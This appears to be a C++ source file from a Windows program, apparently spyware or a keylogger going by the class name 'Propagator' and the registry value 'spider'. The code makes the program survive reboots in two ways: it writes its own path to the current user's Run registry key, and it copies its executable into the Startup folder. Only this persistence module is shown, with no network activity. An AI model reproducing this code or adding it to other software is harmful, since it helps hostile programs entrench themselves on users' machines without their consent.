#include "Propagator.h"

Propagator::Propagator(void)
{
	_runUserKey = NULL;
}

Propagator::~Propagator(void)
{
	if (_runUserKey) {
		RegCloseKey(_runUserKey);
	}
}

void Propagator::init(void)
{
	try {
		setRegKey(HKEY_CURRENT_USER, &_runUserKey, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
	} catch (std::runtime_error const& e) {
		StaticTools::Log << e.what() << std::endl;
	}
	_userStartUpPath = StaticTools::GetFolderPath(CSIDL_STARTUP);
}

void Propagator::setApplicationPath(std::string const& appliPath)
{
	_exePath = appliPath;
}

void Propagator::update(void)
{
	if (!isRegValueExist(_runUserKey, "spider")) {
		addRegValue(_runUserKey, "spider", "\"" + _exePath + "\"");
	}

	if (!isInStartUpFolder(_userStartUpPath)) {
		addInStartUpFolder(_userStartUpPath);
	}
}

void Propagator::setRegKey(HKEY type, HKEY *toSet, std::string const& path)
{
	long res = RegOpenKeyEx(type, path.c_str(), 0, KEY_READ | KEY_WRITE, toSet);
	if (res != ERROR_SUCCESS)
	{
		std::string hkeyStr;
		if (type == HKEY_CURRENT_USER)
			hkeyStr = "HKEY_CURRENT_USER";
		else if (type == HKEY_LOCAL_MACHINE)
			hkeyStr = "HKEY_LOCAL_MACHINE";
		throw (std::runtime_error(std::string("Warning: can't access '" + hkeyStr + "\\" + path + "'")));
	}
}

bool Propagator::isRegValueExist(HKEY key, std::string const& path) const
{
	return (RegQueryValueEx(key, path.c_str(), NULL, NULL, NULL, NULL) != ERROR_FILE_NOT_FOUND);
}

void Propagator::addRegValue(HKEY key, std::string const& name, std::string const& value)
{
	long res = RegSetValueEx(key, name.c_str(), 0, REG_SZ, (LPBYTE)value.c_str(), value.size());
	if (res != ERROR_SUCCESS) {
		StaticTools::Log << "Warning: can't writing to registry" << std::endl;
	}
}

bool Propagator::isInStartUpFolder(std::string const& startUpFolder) const
{
	if (startUpFolder.empty())
		return (true);

	return (boost::filesystem::exists(startUpFolder + "\\" + APP_NAME));
}

void Propagator::addInStartUpFolder(std::string const& startUpFolder)
{
	std::string startUpExePath;

	if (!startUpFolder.empty()) {
		startUpExePath = startUpFolder + "\\" + APP_NAME;
		CopyFile(_exePath.c_str(), startUpExePath.c_str(), FALSE);
		StaticTools::Log << "copying " + _exePath + " to " + startUpExePath << std::endl;
	}
}